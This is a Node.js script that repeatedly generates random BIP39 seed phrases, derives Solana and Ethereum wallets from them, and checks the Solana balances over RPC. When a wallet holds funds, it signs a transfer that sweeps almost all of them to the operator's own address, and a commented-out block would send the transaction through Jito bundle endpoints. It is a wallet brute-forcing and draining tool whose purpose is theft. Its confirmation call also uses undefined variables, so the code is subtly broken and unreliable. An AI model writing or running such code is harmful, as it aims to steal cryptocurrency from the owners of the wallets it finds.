

require("dotenv").config()
const {Connection,Transaction,Keypair,ComputeBudgetProgram, SystemProgram, PublicKey} = require('@solana/web3.js');
const bip39 = require('bip39');
const fs=require("fs")
const { ethers } = require('ethers');

const myWalletAddress=process.env.WALLET_ADDRESS;

const connection=new Connection(process.env.RPC_API);

setInterval(async () => {
    const mnemonic = bip39.generateMnemonic();
    console.log(mnemonic)
    const seed =  bip39.mnemonicToSeedSync(mnemonic);
    const seedBuffer = Buffer.from(seed).slice(0, 32);
    const keypair = Keypair.fromSeed(seedBuffer);
    const etherWallet=ethers.Wallet.fromPhrase(mnemonic);
    const balance=await connection.getBalance(keypair.publicKey);
    console.log({ethereumAddress:etherWallet.address})
    // console.log({solanaWallet:keypair.publicKey.toBase58()})
    console.log({solanaWallet:keypair.publicKey.toBase58(),solanaBalance:balance})
    if(balance>0){
        const tx=new Transaction();
        // tx.add(ComputeBudgetProgram.setComputeUnitPrice({microLamports:10000}));
        tx.add(SystemProgram.transfer({
            fromPubkey:keypair.publicKey,
            toPubkey:new PublicKey(myWalletAddress),
            lamports:balance-5000
        }));
        tx.feePayer=keypair.publicKey;
        const latestBlock=await connection.getLatestBlockhash();
        tx.recentBlockhash=latestBlock.blockhash;
        tx.sign([keypair]);

        try {
            const txnSignature = await connection.sendTransaction(tx,{maxRetries:3});
            const txResult=await connection.confirmTransaction({
                signature: txnSignature,
                blockhash: blockhash,
                lastValidBlockHeight: lastValidBlockHeight,
            });
            console.log(txResult)
            process.exit();
            return true;
        } catch (error) {
            console.log(error)
            process.exit();
            return false;
        }
        
        // const txSerialized=bs58.encode(tx.serialize());
        // let payload = {
        //     jsonrpc: "2.0",
        //     id: 1,
        //     method: "sendBundle",
        //     params: [[txSerialized]]
        // };
        // const jito_endpoints = [
        //     'https://ny.mainnet.block-engine.jito.wtf/api/v1/bundles',
        //     'https://mainnet.block-engine.jito.wtf/api/v1/bundles',
        //     'https://amsterdam.mainnet.block-engine.jito.wtf/api/v1/bundles',
        //     'https://frankfurt.mainnet.block-engine.jito.wtf/api/v1/bundles',
        //     'https://tokyo.mainnet.block-engine.jito.wtf/api/v1/bundles',
        // ];
        // var withdrawTxResult=false;
        // for(var endpoint of jito_endpoints){
        //     // const withdrawTxRes=await fetch(`${endpoint}`, {
        //     await fetch(`${endpoint}`, {
        //         method: 'POST',
        //         body: JSON.stringify(payload),
        //         headers: { 'Content-Type': 'application/json' }
        //     })
        //     .then(response=>response.json())
        //     .then(response=>{
        //         if(!response.error) withdrawTxResult=true;
        //         console.log(`-------------${endpoint}--------------`)
        //         console.log(response)
        //         console.log(`---------------------------`)
        //     })
        // }
    }

}, 100);